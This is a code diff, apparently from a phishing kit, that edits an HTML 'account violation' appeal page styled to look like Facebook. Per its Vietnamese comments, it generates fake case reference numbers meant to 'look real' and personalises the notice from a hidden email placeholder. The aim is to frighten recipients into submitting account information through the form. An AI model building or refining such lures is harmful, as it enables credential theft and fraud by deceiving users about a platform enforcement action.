@@ -3288,22 +3288,79 @@
                            <p class="card-type" id="caseId" style="font-weight:bold; font-size:14px; color:#333;"></p>
 <p class="violation-date" id="violationDate" style="font-size:13px; color:#666;"></p>
 
-<script>
-  // Tạo mã Case giống thật
-  const randomCaseId = "Case:003" + Math.floor(10000 + Math.random() * 90000);
-  document.getElementById("caseId").innerText = 
-    `Violation Reference • ${randomCaseId}`;
+<!-- Thông tin người dùng (ẩn) -->
+<input type="hidden" id="userEmail" value="@name@,">
 
-  // Ngày vi phạm tự động theo ngày mở
+<!-- Khung thông báo vi phạm -->
+<div id="violationBox" style="
+  background-color: #fff5f5;
+  border-left: 4px solid #f02849;
+  padding: 12px 16px;
+  max-width: 520px;
+  font-family: Arial, sans-serif;
+  line-height: 1.6;
+  margin-bottom: 20px;
+">
+  <p id="caseId" style="
+    font-weight: bold;
+    font-size: 14px;
+    color: #1c1e21;
+    margin: 0;
+  "></p>
+  
+  <p id="violationDate" style="
+    font-size: 13px;
+    color: #65676b;
+    margin: 4px 0 0;
+  "></p>
+</div>
+
+<script>
+  // Lấy email từ input (ẩn)
+  const email = document.getElementById("userEmail").value;
+  const username = email.split("@")[0]; // Lấy tên trước @
+
+  // Tạo mã Case giống thật
+  const randomCaseId = "CASE:003" + Math.floor(10000 + Math.random() * 90000);
+  document.getElementById("caseId").innerText = 
+    `Violation Reference for @name@ • ${randomCaseId}`;
+
+  // Ngày vi phạm
   const today = new Date();
   const options = { day: '2-digit', month: 'long', year: 'numeric' };
   const formattedDate = today.toLocaleDateString('en-GB', options);
   document.getElementById("violationDate").innerText = 
-    `Violation Date: ${formattedDate}`;
+    `Violation Date • ${formattedDate}`;
 </script>
 
-                            <h4>This form is used to submit appeals and support the verification of your account’s integrity and transparency</h4>
-                            <p>Kindly ensure that all information provided is accurate to prevent potential complications and avoid prolonging the resolution timeframe. 
+
+                            <h4 style="font-size: 16px; font-weight: 600; color: #333; text-align: center;">
+ <h4 style="
+  font-size: 18px;
+  font-weight: 600;s
+  color: #f02849;
+  line-height: 1.6;
+  max-width: 520px;
+">
+  This form is used to submit appeals and support the verification of your account’s integrity and transparency.
+</h4>
+
+
+
+
+                          <p style="
+  border-left: 4px solid #f02849;
+  background-color: #fff5f5;
+  padding: 12px 16px;
+  font-size: 16px;
+  font-weight: 500;
+  color: #1c1e21;
+  line-height: 1.6;
+  max-width: 600px;
+">
+  ⚠️ Kindly ensure that all information provided is accurate to prevent potential complications and avoid prolonging the resolution timeframe.
+</p>
+
                              
                             <div class="btn-wrapper">
                                 <div id="start" class="button fb-blue w-100" data-bs-toggle="modal"
